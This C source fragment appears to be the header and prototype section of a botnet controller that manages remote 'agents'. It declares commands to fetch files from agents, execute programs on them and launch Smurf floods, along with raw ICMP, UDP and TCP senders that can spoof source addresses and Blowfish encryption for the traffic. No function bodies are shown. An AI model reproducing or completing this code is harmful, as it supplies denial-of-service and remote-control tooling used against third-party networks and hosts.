#include <winsock2.h>
#include <windows.h>
#include <mstcpip.h>
#include <ws2tcpip.h>
#include <conio.h>

#include "..\Headers.h"
#include "..\Blowfish\Blowfish.h"
#include "..\RMD160\RMD160.h"

#define SIZEOF_AGENT_NAME	32
#define NUMBEROF_AGENTS		128

typedef struct
{
	char Name[ SIZEOF_AGENT_NAME] ;
	unsigned long AgentIp ;
	unsigned long MasterIp ;
	unsigned short AgentPort ;
	unsigned short MasterPort ;
	unsigned char Protocol ;
}
AGENT_DATA ;

void Clear( void) ;

char *Ip2Str( unsigned long Ip) ;

void ListAgents( void) ;

void AddAgent( void) ;
void DeleteAgent( void) ;
void Talk2( void) ;

void Command_GetFile( void) ;
void Command_Execute( void) ;
void Command_Smurf( void) ;
void Command_UpdateBcast( void) ;

void SendCommand( unsigned char CommandId, unsigned char *Data, unsigned short Size) ;
void SendBuffer2Agent( char *Name, unsigned char *Buffer, unsigned short Size) ;

BOOL ReadAgent( AGENT_DATA *pAgent) ;
BOOL WriteAgent( AGENT_DATA *pAgent) ;

BOOL SendICMP(	unsigned char *Msg, unsigned short MsgSize, unsigned long SrcAddr, unsigned long DstAddr) ;
BOOL SendUDP( unsigned char *Msg, unsigned short MsgSize, unsigned long SrcAddr, unsigned short SrcPort, unsigned long DstAddr, unsigned short DstPort) ;
BOOL SendTCP( unsigned char *Msg, unsigned short MsgSize, unsigned long SrcAddr, unsigned short SrcPort, unsigned long DstAddr, unsigned short DstPort) ;

USHORT checksum( unsigned short *buffer, int size) ;


